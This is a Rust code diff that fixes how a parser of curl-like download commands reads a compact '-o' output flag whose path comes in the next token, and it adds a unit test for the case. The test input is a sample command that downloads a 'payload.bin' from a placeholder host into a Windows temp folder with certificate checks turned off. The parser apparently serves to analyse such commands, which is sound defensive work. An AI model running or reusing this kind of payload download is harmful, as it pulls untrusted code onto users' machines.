@@ -1731,8 +1731,17 @@ fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>
             }
         }
         if let Some(rest) = compact_curl_short_output_arg(raw_token) {
-            dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
-            i += 1;
+            if rest.is_empty() {
+                let Some(next) = tokens.get(i + 1) else {
+                    i += 1;
+                    continue;
+                };
+                dst = Some(next.trim_matches(['"', '\'', ')']).to_string());
+                i += 2;
+            } else {
+                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+                i += 1;
+            }
             continue;
         }
         if let Some(normalized) = normalize_liberal_url_token(token) {
@@ -1830,11 +1839,7 @@ fn compact_curl_short_output_arg(token: &str) -> Option<&str> {
     }
     let flag = token[1..].find('o')?;
     let rest = &token[1 + flag + 1..];
-    if rest.is_empty() {
-        None
-    } else {
-        Some(rest)
-    }
+    Some(rest)
 }
 
 fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
@@ -6511,6 +6516,20 @@ mod curl_redirect_parser_tests {
             Some((
                 "https://curl-compact.example/payload.bin".to_string(),
                 Some("C:\\Temp\\compact.bin".to_string())
+            ))
+        );
+    }
+
+    #[test]
+    fn parse_curl_like_download_accepts_compact_short_output_next_token() {
+        let tokens = split_words(
+            r#"curl -ko C:\Temp\next.bin https://curl-compact-next.example/payload.bin"#,
+        );
+        assert_eq!(
+            parse_curl_like_download(&tokens),
+            Some((
+                "https://curl-compact-next.example/payload.bin".to_string(),
+                Some("C:\\Temp\\next.bin".to_string())
             ))
         );
     }
